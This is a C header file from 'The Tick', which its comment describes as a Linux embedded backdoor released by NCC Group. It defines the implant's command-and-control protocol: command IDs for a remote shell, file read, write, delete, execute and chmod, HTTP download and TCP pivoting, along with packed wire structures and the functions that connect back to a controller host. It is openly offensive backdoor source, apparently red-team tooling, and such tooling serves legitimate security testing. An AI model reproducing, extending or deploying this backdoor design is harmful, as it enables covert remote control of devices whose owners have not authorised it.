/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef PARSER_H
#define PARSER_H

#include <sys/types.h>
#include <stdint.h>

//  fix compiling on OSX
#if defined(__APPLE__)
    #define MSG_NOSIGNAL 0
#endif 

// Base command IDs per category.
#define BASE_CMD_SYSTEM         0x0000
#define BASE_CMD_FILE           0x0100
#define BASE_CMD_NET            0x0200

// No operation command.
#define CMD_NOP                 0xFFFF

// System commands.
#define CMD_SYSTEM_EXIT         BASE_CMD_SYSTEM + 0
#define CMD_SYSTEM_FORK         BASE_CMD_SYSTEM + 1
#define CMD_SYSTEM_SHELL        BASE_CMD_SYSTEM + 2
//#define CMD_SYSTEM_SIGNAL       BASE_CMD_SYSTEM + 3     // TODO
//#define CMD_SYSTEM_PS           BASE_CMD_SYSTEM + 4     // TODO
//#define CMD_SYSTEM_INSTALL      BASE_CMD_SYSTEM + 5     // TODO PRIORITY
//#define CMD_SYSTEM_UNINSTALL    BASE_CMD_SYSTEM + 6     // TODO PRIORITY

// File I/O commands.
#define CMD_FILE_READ           BASE_CMD_FILE + 0
#define CMD_FILE_WRITE          BASE_CMD_FILE + 1
#define CMD_FILE_DELETE         BASE_CMD_FILE + 2
#define CMD_FILE_EXEC           BASE_CMD_FILE + 3
#define CMD_FILE_CHMOD          BASE_CMD_FILE + 4
//#define CMD_FILE_STAT           BASE_CMD_FILE + 5       // TODO
//#define CMD_FILE_LIST           BASE_CMD_FILE + 6       // TODO
//#define CMD_FILE_FIND           BASE_CMD_FILE + 7       // TODO
//#define CMD_FILE_COPY           BASE_CMD_FILE + 8       // TODO
//#define CMD_FILE_MOVE           BASE_CMD_FILE + 9       // TODO

// Network commands.
#define CMD_HTTP_DOWNLOAD       BASE_CMD_NET + 0
#define CMD_DNS_RESOLVE         BASE_CMD_NET + 1
#define CMD_TCP_PIVOT           BASE_CMD_NET + 2
//#define CMD_TCP6_PIVOT          BASE_CMD_NET + 3        // TODO
//#define CMD_TCP_TUNNEL          BASE_CMD_NET + 4        // TODO
//#define CMD_TCP6_TUNNEL         BASE_CMD_NET + 5        // TODO
//#define CMD_UDP_TUNNEL          BASE_CMD_NET + 6        // TODO
//#define CMD_UDP6_TUNNEL         BASE_CMD_NET + 7        // TODO

// Command header.
#pragma pack(push, 1)
typedef struct              // (all values below in network byte order)
{
    uint16_t cmd_id;        // Command ID
    uint16_t cmd_len;       // Small data size, to be read in memory while parsing
    uint32_t data_len;      // Big data size, to be read by command implementations
} CMD_HEADER;
#pragma pack(pop)

// Response codes.
#define CMD_STATUS_OK      0x00
#define CMD_STATUS_ERROR   0xFF

// Response header.
#pragma pack(push, 1)
typedef struct              // (all values below in network byte order)
{
    uint8_t  status;        // Status code (OK or ERROR)
    uint32_t data_len;      // Big data size
} RESP_HEADER;
#pragma pack(pop)

// TCP pivot structure for IPv4.
#pragma pack(push, 1)
typedef struct              // (all values below in network byte order)
{
    uint32_t ip;            // IP address to connect to
    uint16_t port;          // TCP port to connect to
    uint16_t from_port;     // Optional TCP port to connect from
} CMD_TCP_PIVOT_ARGS;
#pragma pack(pop)

// TCP tunnel structure for IPv4.
#pragma pack(push, 1)
typedef struct                  // (all values below in network byte order)
{
    uint32_t src_ip;            // Source IP address
    uint32_t dst_ip;            // Destination IP address
    uint16_t src_port;          // Source TCP port
    uint16_t dst_port;          // Destination TCP port
    uint16_t from_src_port;     // Optional source connecting port for source (if connecting)
    uint16_t from_dst_port;     // Optional source connecting port for destination
} CMD_TCP_TUNNEL_ARGS;
#pragma pack(pop)

// Parser class definition.
typedef struct
{
    char *hostname;
    int port;
    void *callback;     // it's really ConnectionCallback
    void *userdata;
    unsigned char uuid[16];
    int fd;
    CMD_HEADER header;
    char *buffer[1024];
} Parser;

// Callback function type.
typedef int (*ConnectionCallback)(Parser *parser, void *userdata);

// Parser method signatures.
void uuid4(unsigned char *uuid);
void parser_init(Parser *parser, const char *hostname, int port, ConnectionCallback callback, void *userdata);
void parser_close(Parser *parser);
void parser_begin_response(Parser *parser, uint8_t status, uint16_t length);
void parser_ok(Parser *parser);
void parser_error(Parser *parser, const char *error);
int parser_is_connected(Parser *parser);
void parser_connect(Parser *parser);
void parser_wait(Parser *parser);
void parser_next(Parser *parser);
ssize_t parser_get_first_arg(Parser *parser);
ssize_t parser_get_second_arg(Parser *parser);
ssize_t parser_read_first_arg(Parser *parser, char *buffer, size_t count);
ssize_t parser_read_second_arg(Parser *parser, char *buffer, size_t count);
ssize_t parser_pipe_second_arg(Parser *parser, int fd_dst);

#endif /* PARSER_H */
